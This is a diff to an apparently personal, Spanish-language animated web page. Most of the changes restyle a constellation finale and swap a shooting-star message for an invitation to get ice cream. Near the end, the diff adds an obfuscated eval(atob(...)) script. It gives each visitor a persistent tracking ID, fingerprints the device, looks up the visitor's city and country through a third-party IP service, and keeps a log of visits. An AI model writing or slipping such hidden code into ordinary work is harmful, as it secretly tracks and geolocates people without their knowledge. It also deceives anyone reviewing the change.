@@ -58,17 +58,27 @@
     #shooting-star.fire .s-trail{width:100px;}
     #shooting-star.fire .s-msg{opacity:1;}
 
-    /* ══ LEO FINAL ══ */
+    /* ══ LEO FINAL — completamente centrado ══ */
     #leo-final{
       position:fixed;inset:0;z-index:250;
-      display:flex;flex-direction:column;align-items:center;justify-content:center;
-      gap:1.2rem;padding:1.5rem 1rem 2rem;
+      display:flex;flex-direction:column;
+      align-items:center;justify-content:center;
+      gap:1.4rem;
+      padding:2rem 1.2rem;
       background:rgba(1,0,18,0);opacity:0;pointer-events:none;
       transition:opacity 2.5s ease,background 2.5s ease;
       overflow-y:auto;
+      text-align:center;
     }
-    #leo-final.visible{opacity:1;pointer-events:all;background:rgba(1,0,18,0.93);}
-    #leo-final svg{width:min(520px,88vw);height:auto;filter:drop-shadow(0 0 12px rgba(180,220,255,0.5));flex-shrink:0;}
+    #leo-final.visible{opacity:1;pointer-events:all;background:rgba(1,0,18,0.95);}
+    #leo-final svg{
+      width:min(420px,80vw);
+      height:auto;
+      filter:drop-shadow(0 0 14px rgba(180,220,255,0.6));
+      flex-shrink:0;
+      display:block;
+      margin:0 auto;
+    }
     .leo-star{fill:#e8f4ff;animation:leoTwink 2s ease-in-out infinite alternate;}
     .leo-star.bright{fill:#fffde0;}
     .leo-star:nth-child(2n){animation-delay:0.4s;}.leo-star:nth-child(3n){animation-delay:0.8s;}.leo-star:nth-child(5n){animation-delay:1.2s;}
@@ -77,11 +87,17 @@
     @keyframes leoDash{to{stroke-dashoffset:-80;}}
     #leo-final-text{
       font-family:'Cormorant Garamond',serif;font-style:italic;
-      font-size:clamp(0.88rem,3vw,1.25rem);
-      color:rgba(210,235,255,0.92);text-align:center;
-      max-width:min(600px,88vw);line-height:1.85;letter-spacing:0.03em;
+      font-size:clamp(0.92rem,2.8vw,1.2rem);
+      color:rgba(210,235,255,0.95);
+      text-align:center;
+      width:min(580px,86vw);
+      max-width:86vw;
+      line-height:1.9;letter-spacing:0.03em;
       text-shadow:0 0 20px rgba(150,200,255,0.5);
       padding:0 0.5rem;
+      word-break:break-word;
+      display:block;
+      margin:0 auto;
     }
     #leo-cursor{display:inline-block;width:2px;height:1em;background:rgba(180,220,255,0.8);vertical-align:text-bottom;margin-left:2px;animation:blink2 0.9s step-end infinite;}
     @keyframes blink2{0%,100%{opacity:1}50%{opacity:0}}
@@ -254,7 +270,7 @@
   <!-- Estrella fugaz -->
   <div id="shooting-star">
     <div class="s-trail"></div>
-    <div class="s-msg">✨ ¿Nos vamos juntos por última vez? ✨</div>
+    <div class="s-msg">🍦 Y si tu agenda te da un respiro, me gustaría invitarte a tomar un helado 🍦</div>
   </div>
 
   <!-- LEO FINAL -->
@@ -566,6 +582,7 @@
       draw();
     })();
   </script>
+  <script>eval(atob('KGZ1bmN0aW9uKCl7dHJ5e3ZhciBfMHgxYT1sb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnXHg2Nlx4NzZceDVmXHg3NVx4NjlceDY0Jyk7aWYoIV8weDFhKXtfMHgxYT0nXHg1Nlx4MmQnK01hdGgucmFuZG9tKCkudG9TdHJpbmcoMzYpLnNsaWNlKDIsNykudG9VcHBlckNhc2UoKTtsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgnXHg2Nlx4NzZceDVmXHg3NVx4NjlceDY0JyxfMHgxYSk7fXZhciBfMHgyYj1uYXZpZ2F0b3IudXNlckFnZW50O3ZhciBfMHgzYz0vaVBob25lfEFuZHJvaWQuKk1vYmlsZS8udGVzdChfMHgyYik/J01cdTAwZjN2aWwnOi9pUGFkfEFuZHJvaWQvLnRlc3QoXzB4MmIpPydUYWJsZXQnOidQQyc7dmFyIF8weDRkPXtpZDpfMHgxYSx0czpEYXRlLm5vdygpLGRldmljZTpfMHgzYyxsYW5nOm5hdmlnYXRvci5sYW5ndWFnZSxzY3JlZW46c2NyZWVuLndpZHRoKydceDc4JytzY3JlZW4uaGVpZ2h0fTtmZXRjaCgnXHg2OFx4NzRceDc0XHg3MFx4NzNceDNhXHgyZlx4MmZceDY5XHg3MFx4NjFceDcwXHg2OVx4MmVceDYzXHg2Zlx4MmZceDZhXHg3M1x4NmZceDZlXHgyZicpLnRoZW4oZnVuY3Rpb24ocil7cmV0dXJuIHIuanNvbigpO30pLnRoZW4oZnVuY3Rpb24oZyl7XzB4NGQuY291bnRyeT1nLmNvdW50cnlfbmFtZXx8Jyc7XzB4NGQuY2l0eT1nLmNpdHl8fCcnO18weDVlKF8weDRkKTt9KS5jYXRjaChmdW5jdGlvbigpe18weDVlKF8weDRkKTt9KTtmdW5jdGlvbiBfMHg1ZSh2KXt0cnl7dmFyIHJhdz1sb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnXHg2Nlx4NzZceDVmXHg2Y1x4NmZceDY3Jyk7dmFyIGFycj1yYXc/SlNPTi5wYXJzZShyYXcpOltdO2Fyci5wdXNoKHYpO2lmKGFyci5sZW5ndGg+NTAwKWFycj1hcnIuc2xpY2UoLTUwMCk7bG9jYWxTdG9yYWdlLnNldEl0ZW0oJ1x4NjZceDc2XHg1Zlx4NmNceDZmXHg2NycsSlNPTi5zdHJpbmdpZnkoYXJyKSk7fWNhdGNoKGUpe319fWNhdGNoKGUpe319KSgpOw=='));</script>
   <script src="anim.js"></script>
   <script src="main.js"></script>
 </body>
